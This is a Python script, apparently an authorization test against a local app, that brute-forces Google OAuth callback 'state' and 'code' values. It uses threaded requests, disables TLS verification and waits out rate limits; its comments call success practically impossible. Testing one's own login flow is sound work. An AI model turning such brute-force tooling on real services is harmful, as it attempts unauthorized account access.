import argparse
import threading
import time
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

import os
import base64

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import urllib3
from urllib import parse

from datetime import datetime, timezone

def make_session():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.2, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    return session

def make_url(url: str, state: str, code: str) -> str:
    return f'https://localhost:5001/auth/google/callback?state={parse.quote_plus(state)}&iss={parse.quote_plus("https://accounts.google.com")}&code={parse.quote_plus(code)}&scope={parse.quote_plus("email+profile+https://www.googleapis.com/auth/userinfo.email+openid+https://www.googleapis.com/auth/userinfo.profile")}&authuser=0&prompt=none'

def base64len(length: int) -> str:
    return base64.b64encode(os.urandom(length)).decode('utf-8')[:length]

def generate_state() -> str:
    return base64len(30)
# 34336838202925124846578490892810000000000000000000000000000000000000000000000000000000000000000
# possibilities

def generate_code() -> str:
    return f'4/0AeoWuM{base64len(64)}'

# 39402006196394479212279040100143613805079739270465446667948293404245721771497210611414266254884915640806627990306816
# possibilities

# your odds of success are approximately 7.39130907256e-211
# seems pretty infeasible to go through the numbers in order

def try_login(session, verbose: bool, url: str):
    state = generate_state()
    code = generate_code()

    url = make_url(url, state, code)
    if verbose:
        print(f'trying state: {state} code: {code}')

    try:
        response = session.get(url, timeout=10, allow_redirects=True, verify=False)
        body = response.text.lower()
        success = "questionnaire"

        if verbose:
            mark = "yes" if success in body else "no"
            print(f" [{mark}] HTTP {response.status_code}")

        if response.status_code == 429:
            return "ratelimited"
        if response.status_code in (423, 403) and "locked" in body:
            return "locked"
        if success in body:
            return "success", state, code

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
    return "fail"

def set_auth(session, token):
    if token:
        session.headers["AUTHORIZATION"] = f"Bearer {token}"

def save_report(data, path):
    data["generated"] = datetime.now(timezone.utc).isoformat()
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print("Report saved to social_results.json")

def main():
    parser = argparse.ArgumentParser(description="TOTP brute-force simulation")
    parser.add_argument("--url",          default="https://localhost:5001")
    parser.add_argument("--session-token", default=None)
    parser.add_argument("--verbose",      action="store_true")
    parser.add_argument("--threads",      default=10, type=int)
    parser.add_argument("--output",       default="social_results.json")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    s = make_session()
    set_auth(s, args.session_token)

    # start google login flow
    s.get(f"{args.url}/auth/login/google", verify=False, allow_redirects=True)

    result_data = {"url": args.url, "findings": []}

    found = False
    start_time = time.time()
    executor = ThreadPoolExecutor(max_workers=args.threads)

    def try_single():
        nonlocal found
        while True:
            if found:
                return None
            
            result = try_login(s, args.verbose, args.url)
            if result[0] == "success":
                found = result[1], result[2]
                print(f"\n[!!!] Social login accepted, state: {result[1]} code: {result[2]}")
            elif result == "ratelimited":
                time.sleep(30)

    futures = {executor.submit(try_single) for _ in range(10)}
    try:
        for future in as_completed(futures):
            if found:
                result_data["findings"].append({"type": "success", "state": found[0], "code": found[1]})
                executor.shutdown(wait=False, cancel_futures=True)
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[!] Cancelled execution, tried for {elapsed:.2f} with {args.threads} workers, no match found")
        executor.shutdown(wait=False, cancel_futures=True)

        result_data["findings"].append({"type": "cancelled", "time": f"{elapsed:.2f}", "threads": args.threads})
        save_report(result_data, args.output)

        os._exit(1)

    save_report(result_data, args.output)
    
if __name__ == "__main__":
    main()
